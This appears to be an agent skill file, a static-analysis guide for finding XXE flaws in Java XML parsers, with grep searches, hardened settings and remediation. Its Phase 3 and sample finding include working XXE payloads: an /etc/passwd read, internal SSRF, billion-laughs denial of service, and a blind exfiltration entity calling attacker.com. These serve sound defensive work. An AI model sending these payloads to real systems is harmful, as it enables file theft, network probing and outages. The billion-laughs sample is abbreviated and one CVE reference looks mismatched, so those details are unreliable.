# SKILL: sast-xxe — XML External Entity Injection Detection

## Purpose

Identify XML parsers and XML-consuming endpoints in Java applications that are vulnerable to XXE (XML External Entity) attacks. XXE can lead to local file disclosure, SSRF, denial of service, and in some configurations remote code execution.

---

## Phase 1: Sink Discovery

### 1.1 — DocumentBuilder (DOM Parser)

```bash
# DocumentBuilderFactory — most common XXE vector
grep -rn "DocumentBuilderFactory\b" --include="*.java" -A10

# Check if XXE protections are set
grep -rn "DocumentBuilderFactory" --include="*.java" -A15 | grep -A15 "setFeature\|setExpandEntityReferences\|setXIncludeAware"
```

**Safe configuration looks like:**
```java
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);
```

Any `DocumentBuilderFactory` **without** these features set is a finding.

### 1.2 — SAX Parser

```bash
grep -rn "SAXParserFactory\b\|SAXParser\b\|XMLReader\b\|SAXBuilder\b\|SAXReader\b" --include="*.java" -A10

# Check for security features
grep -rn "SAXParserFactory\|SAXParser" --include="*.java" -A15 | grep "setFeature\|setProperty"
```

**Safe SAX:**
```java
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

### 1.3 — StAX Parser (XMLInputFactory)

```bash
grep -rn "XMLInputFactory\b" --include="*.java" -A10

# XMLInputFactory property check
grep -rn "XMLInputFactory" --include="*.java" -A10 | grep "setProperty\|IS_SUPPORTING_EXTERNAL_ENTITIES\|SUPPORT_DTD"
```

**Safe StAX:**
```java
factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
```

### 1.4 — JAXB Unmarshaller

```bash
grep -rn "JAXBContext\|Unmarshaller\b\|JAXB\.unmarshal\b" --include="*.java" -A5

# JAXB uses DOM or SAX internally — check if custom unmarshal source is passed
grep -rn "unmarshal\b" --include="*.java" | grep -v "//\|test\|Test"
```

JAXB with default `unmarshal(InputStream)` is vulnerable unless the underlying parser is hardened.

### 1.5 — Other XML Libraries

```bash
# dom4j
grep -rn "SAXReader\b\|DocumentHelper\b\|dom4j\b" --include="*.java" -A5
# dom4j SAXReader is vulnerable unless XMLReader is hardened

# XStream — also XXE vector
grep -rn "XStream\b" --include="*.java" | grep -v "//\|test\|Test"

# XMLDecoder — extremely dangerous (also RCE via Java serialization)
grep -rn "XMLDecoder\b" --include="*.java"

# JDOM
grep -rn "SAXBuilder\b\|org\.jdom2\|org\.jdom\b" --include="*.java" -A5

# Castor
grep -rn "org\.exolab\.castor\|Unmarshaller\b.*castor" --include="*.java"

# XPath evaluation on untrusted XML
grep -rn "XPathFactory\|XPath\.evaluate\|xpath\.evaluate" --include="*.java" -B5 | grep -B5 "getParameter\|request\.\|@RequestBody"
```

### 1.6 — Spring / Framework XML Processing

```bash
# Spring MVC XML message converters (Jaxb2RootElementHttpMessageConverter)
grep -rn "Jaxb2RootElementHttpMessageConverter\|MarshallingHttpMessageConverter\|XmlMapper\b" --include="*.java"

# @XmlRootElement — JAXB-annotated class accepted as @RequestBody
grep -rn "@XmlRootElement\|@XmlElement\|@XmlAttribute" --include="*.java" -l

# Check if content type "application/xml" or "text/xml" is accepted
grep -rn "application/xml\|text/xml\|MediaType\.APPLICATION_XML" --include="*.java"
grep -rn "@Consumes.*xml\|@RequestMapping.*xml\|produces.*xml\|consumes.*xml" --include="*.java"
```

---

## Phase 2: Taint Analysis — Is User-Supplied XML Parsed?

```bash
# XML parsing with stream from HTTP request
grep -rn "parse\b\|unmarshal\b\|createXMLStreamReader\b" --include="*.java" -B10 | grep -B10 "getInputStream\|getReader\|readAllBytes\|@RequestBody"

# Controller accepting XML content type
grep -rn "consumes.*application/xml\|consumes.*text/xml\|MediaType\.APPLICATION_XML" --include="*.java" -B5

# File upload that parses XML
grep -rn "MultipartFile\b" --include="*.java" -A20 | grep -A20 "parse\|unmarshal\|DocumentBuilder\|SAXParser\|XMLInputFactory"
```

---

## Phase 3: XXE Attack Classes

### 3.1 — File Disclosure XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<request><data>&xxe;</data></request>
```
Impact: Read arbitrary files as the JVM process user.

### 3.2 — SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.corp/admin">]>
<request><data>&xxe;</data></request>
```
Impact: Probe internal network.

### 3.3 — Billion Laughs (DoS)
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```
Impact: OOM / CPU exhaustion.

### 3.4 — Blind XXE (OOB via DNS)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe?data="> %xxe;]>
```
Impact: Out-of-band data exfiltration; harder to exploit but confirming the vector is enough.

---

## Phase 4: Severity Assessment

| Condition | Severity |
|-----------|---------|
| Unauthenticated XML endpoint, no XXE protection | CRITICAL |
| Authenticated XML endpoint, no XXE protection | HIGH |
| File upload parsed as XML, no protection | HIGH |
| `XMLDecoder` with user-supplied input | CRITICAL (also RCE) |
| XStream with user-supplied XML | CRITICAL (also RCE) |
| JAXB endpoint, parser not hardened | HIGH |
| DTD disabled but external entities still allowed | MEDIUM |
| Only entity expansion protected (billion laughs only) | MEDIUM |

---

## Phase 5: Safe Pattern Reference

These patterns are **safe** — do not report:
```java
// SAFE: Feature flag disabling DTD entirely
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// SAFE: XMLInputFactory with entities disabled
xmlInputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, Boolean.FALSE);
xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, Boolean.FALSE);

// SAFE: Jackson XmlMapper (uses Woodstox, safe by default in recent versions)
// But still check version: Woodstox < 6.4.0 may be vulnerable
```

---

## Finding Format Example

```
### [CRITICAL] XXE — Unauthenticated XML Endpoint Without Parser Hardening

**File:** `src/main/java/com/example/ImportController.java:41`
**CWE:** CWE-611
**CVSS:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L)

**Vulnerable Code:**
```java
@PostMapping(value = "/api/import", consumes = "application/xml")
public ResponseEntity<?> importData(@RequestBody InputStream xmlInput) {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); // no features set
    DocumentBuilder builder = factory.newDocumentBuilder();
    Document doc = builder.parse(xmlInput); // attacker-controlled XML parsed here
    ...
}
```

**Proof of Concept:**
```
POST /api/import HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<import><field>&xxe;</field></import>
```
Response contains `/etc/passwd` content if entity is reflected.

**Remediation:**
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);
DocumentBuilder builder = factory.newDocumentBuilder();
```

**References:** CWE-611, OWASP A05:2021, CVE-2021-44228 (for XXE+JNDI chains)
```
